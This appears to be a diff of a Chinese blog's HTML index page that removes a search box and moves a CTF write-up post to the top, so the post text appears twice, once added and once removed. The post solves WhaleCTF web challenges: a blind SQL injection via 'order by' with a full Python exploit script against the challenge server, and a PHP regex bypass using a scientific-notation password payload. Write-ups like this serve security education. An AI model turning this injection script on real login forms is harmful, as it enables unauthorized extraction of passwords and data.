@@ -82,20 +82,110 @@
             
                 
                 
-                <li class="menu-item">
-                    <a class="menu-item-link search">
-                        Search                   
-                        <i class="fa fa-long-arrow-right search-icon" aria-hidden="true"></i>
-                    </a>
-                        <input placeholder="Search..." class="search-input" style="display:none;border:none!important;" onkeydown="onEnter(event)" onkeypress="onEnter(event)">
-                </li>
-                
         </ul>
     </nav>
 </header>
     <main class="main">
         <section class="posts">
     
+        <article class="post">
+            <h1>
+                <a class="title" href="/2018/06/06/WhaleCTF的Web题目/"> 
+                    WhaleCTF的Web题目 
+                </a>
+            </h1>
+                        <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2018-06-06   
+                </a>
+                
+                <a class="category">
+                    <i class="fa fa-th" aria-hidden="true"></i>  
+                </a>
+               
+                <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li></ul>
+                
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf，web/">ctf，web</a></li></ul>
+            </div>
+            <div class="content">
+                
+                <h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>最近要做的事太多了，实验班考核、末考、再加上来成都的同学多的一批。。没时间好好学点东西，前两天装Docker，基础太差了，现在Ubuntu上docker都没搭好环境。应对最近的考核，还是刷点题吧</p>
+<h3 id="瞎子摸鱼"><a href="#瞎子摸鱼" class="headerlink" title="瞎子摸鱼"></a>瞎子摸鱼</h3><p>是个Sql注入，一开始有回显我以为是基本的回显注入，后来fuzz发现过滤了函数、Infor、小括号，那基本上与回显注入无缘。我们构造admin是万能函数的时候，发现回显：<br>whaleadmin<br>我猜测这个是用户名，当不构造正确的用户名时，回显：<br>flag in the password content<br>所以后台的语句应该是这样的思路，如果查到用户名存在，则输出用户名的第一个值。若不存在，则返回flag那一堆。。</p>
+<p>一开始我和LinE师傅都没想到用order by来爆破password字段，后来看到一篇类似原题的帖子。。<br><a href="https://www.cnblogs.com/deen-/p/7008939.html" target="_blank" rel="noopener">Inject again 注入 过滤左右括号 order by</a><br>思路挺简单的，就是通过order by的升序排序法进行盲注<br>后来就是写exp了，被LinE师傅嘲讽了一波。。确实py能力太差了= =<br>这里偷偷贴一下LinE师傅的exp：</p>
+<pre><code>#coding:utf-8
+import requests
+
+def send(flag,charset):
+    url = &quot;http://ctf.whaledu.com:10801/47g256f48gff/index.php&quot;
+    h = {&quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;}
+    for i in range(len(charset)):
+        c = flag + charset[i]
+        payload = &quot;whaleadmin&#39; union select 1,0,&#39;{}&#39; order by 3#&quot;.format(c)
+        d = &quot;username={}&amp;password=admin&quot;.format(payload)
+        r = requests.post(url,data=d,headers=h)
+        if &quot;whaleadmin&quot; in r.text:
+            return i
+
+def main():
+    flag = &quot;&quot;
+    num = &quot;0123456789&quot;
+    a_z = &quot;abcdefghijklmnopqrstuvwxyz&quot;
+    charset = list(num + a_z)
+    for i in range(0,80):
+        ret = send(flag, charset)
+        flag += charset[ret-1]
+        print flag
+
+if __name__ == &#39;__main__&#39;:
+    main()</code></pre><h3 id="正则进入"><a href="#正则进入" class="headerlink" title="正则进入"></a>正则进入</h3><p>源码泄露扫描得到：</p>
+<pre><code>&lt;?php
+echo &quot;waht the hell?&quot;;
+$flag = &quot;*******&quot;; 
+if  (&quot;POST&quot; == $_SERVER[&#39;REQUEST_METHOD&#39;]) 
+{ 
+    $password = $_POST[&#39;password&#39;]; 
+    if (0 &gt;= preg_match(&#39;/^[[:graph:]]{12,}$/&#39;, $password)) 
+    { 
+        echo &#39;Wrong Format&#39;; 
+        exit; 
+    } 
+    while (TRUE) 
+    { 
+        $reg = &#39;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&#39;; 
+        if (6 &gt; preg_match_all($reg, $password, $arr)) 
+            break; 
+        $c = 0; 
+        $ps = array(&#39;punct&#39;, &#39;digit&#39;, &#39;upper&#39;, &#39;lower&#39;); 
+        foreach ($ps as $pt) 
+        { 
+            if (preg_match(&quot;/[[:$pt:]]+/&quot;, $password)) 
+                $c += 1; 
+        } 
+        if ($c &lt; 3) break; 
+        if (&quot;42&quot; == $password) echo $flag; 
+        else echo &#39;Wrong password&#39;; 
+        exit; 
+    } 
+}
+?&gt;</code></pre><p>结整段代码来看，我们需要post一个字符串，该字符串的值为42，并且要包含标点、数字、大写字母、小写字母中三个及以上类型，同时匹配次数要不小于6次</p>
+<p>构造的payload:<br><code>password=420.00000e-1</code>或者<code>password=42.000000e-0</code></p>
+<p>利用科学计数法，xe(+-)x代表的意思是，x乘以10的x次方，之所以用.我一开始不明白，但是看一下句子猜测的话，这个点的作用应该还是“乘以”，即420乘以10^(-1)，就是42。而且.也把标点位占了，所以构造很巧妙。</p>
+<p>相关链接:<br><a href="http://dcx.sybase.com/1101/zh/dbreference_zh11/rf-sqllanguage-s-4915351.html" target="_blank" rel="noopener">正则表达式语法</a></p>
+
+                
+            </div>
+            <div class="continue">
+            <a href="/2018/06/06/WhaleCTF的Web题目/">
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            </a>
+            </div>
+        </article>
+        
         <article class="post">
             <h1>
                 <a class="title" href="/2018/06/06/Web题目/"> 
@@ -362,104 +452,6 @@ def tamper(payload, **kwargs):
             </div>
             <div class="continue">
             <a href="/2018/06/06/Web题目/">
-            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
-            </a>
-            </div>
-        </article>
-        
-        <article class="post">
-            <h1>
-                <a class="title" href="/2018/06/06/WhaleCTF的Web题目/"> 
-                    WhaleCTF的Web题目 
-                </a>
-            </h1>
-                        <div class="meta">
-                <a class="date"> 
-                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
-                    2018-06-06   
-                </a>
-                
-                <a class="category">
-                    <i class="fa fa-th" aria-hidden="true"></i>  
-                </a>
-               
-                <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li></ul>
-                
-                <a class="tag">
-                    <i class="fa fa-tags" aria-hidden="true"></i>  
-                </a>
-                
-                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf，web/">ctf，web</a></li></ul>
-            </div>
-            <div class="content">
-                
-                <h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>最近要做的事太多了，实验班考核、末考、再加上来成都的同学多的一批。。没时间好好学点东西，前两天装Docker，基础太差了，现在Ubuntu上docker都没搭好环境。应对最近的考核，还是刷点题吧</p>
-<h3 id="瞎子摸鱼"><a href="#瞎子摸鱼" class="headerlink" title="瞎子摸鱼"></a>瞎子摸鱼</h3><p>是个Sql注入，一开始有回显我以为是基本的回显注入，后来fuzz发现过滤了函数、Infor、小括号，那基本上与回显注入无缘。我们构造admin是万能函数的时候，发现回显：<br>whaleadmin<br>我猜测这个是用户名，当不构造正确的用户名时，回显：<br>flag in the password content<br>所以后台的语句应该是这样的思路，如果查到用户名存在，则输出用户名的第一个值。若不存在，则返回flag那一堆。。</p>
-<p>一开始我和LinE师傅都没想到用order by来爆破password字段，后来看到一篇类似原题的帖子。。<br><a href="https://www.cnblogs.com/deen-/p/7008939.html" target="_blank" rel="noopener">Inject again 注入 过滤左右括号 order by</a><br>思路挺简单的，就是通过order by的升序排序法进行盲注<br>后来就是写exp了，被LinE师傅嘲讽了一波。。确实py能力太差了= =<br>这里偷偷贴一下LinE师傅的exp：</p>
-<pre><code>#coding:utf-8
-import requests
-
-def send(flag,charset):
-    url = &quot;http://ctf.whaledu.com:10801/47g256f48gff/index.php&quot;
-    h = {&quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;}
-    for i in range(len(charset)):
-        c = flag + charset[i]
-        payload = &quot;whaleadmin&#39; union select 1,0,&#39;{}&#39; order by 3#&quot;.format(c)
-        d = &quot;username={}&amp;password=admin&quot;.format(payload)
-        r = requests.post(url,data=d,headers=h)
-        if &quot;whaleadmin&quot; in r.text:
-            return i
-
-def main():
-    flag = &quot;&quot;
-    num = &quot;0123456789&quot;
-    a_z = &quot;abcdefghijklmnopqrstuvwxyz&quot;
-    charset = list(num + a_z)
-    for i in range(0,80):
-        ret = send(flag, charset)
-        flag += charset[ret-1]
-        print flag
-
-if __name__ == &#39;__main__&#39;:
-    main()</code></pre><h3 id="正则进入"><a href="#正则进入" class="headerlink" title="正则进入"></a>正则进入</h3><p>源码泄露扫描得到：</p>
-<pre><code>&lt;?php
-echo &quot;waht the hell?&quot;;
-$flag = &quot;*******&quot;; 
-if  (&quot;POST&quot; == $_SERVER[&#39;REQUEST_METHOD&#39;]) 
-{ 
-    $password = $_POST[&#39;password&#39;]; 
-    if (0 &gt;= preg_match(&#39;/^[[:graph:]]{12,}$/&#39;, $password)) 
-    { 
-        echo &#39;Wrong Format&#39;; 
-        exit; 
-    } 
-    while (TRUE) 
-    { 
-        $reg = &#39;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&#39;; 
-        if (6 &gt; preg_match_all($reg, $password, $arr)) 
-            break; 
-        $c = 0; 
-        $ps = array(&#39;punct&#39;, &#39;digit&#39;, &#39;upper&#39;, &#39;lower&#39;); 
-        foreach ($ps as $pt) 
-        { 
-            if (preg_match(&quot;/[[:$pt:]]+/&quot;, $password)) 
-                $c += 1; 
-        } 
-        if ($c &lt; 3) break; 
-        if (&quot;42&quot; == $password) echo $flag; 
-        else echo &#39;Wrong password&#39;; 
-        exit; 
-    } 
-}
-?&gt;</code></pre><p>结整段代码来看，我们需要post一个字符串，该字符串的值为42，并且要包含标点、数字、大写字母、小写字母中三个及以上类型，同时匹配次数要不小于6次</p>
-<p>构造的payload:<br><code>password=420.00000e-1</code>或者<code>password=42.000000e-0</code></p>
-<p>利用科学计数法，xe(+-)x代表的意思是，x乘以10的x次方，之所以用.我一开始不明白，但是看一下句子猜测的话，这个点的作用应该还是“乘以”，即420乘以10^(-1)，就是42。而且.也把标点位占了，所以构造很巧妙。</p>
-<p>相关链接:<br><a href="http://dcx.sybase.com/1101/zh/dbreference_zh11/rf-sqllanguage-s-4915351.html" target="_blank" rel="noopener">正则表达式语法</a></p>
-
-                
-            </div>
-            <div class="continue">
-            <a href="/2018/06/06/WhaleCTF的Web题目/">
             Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
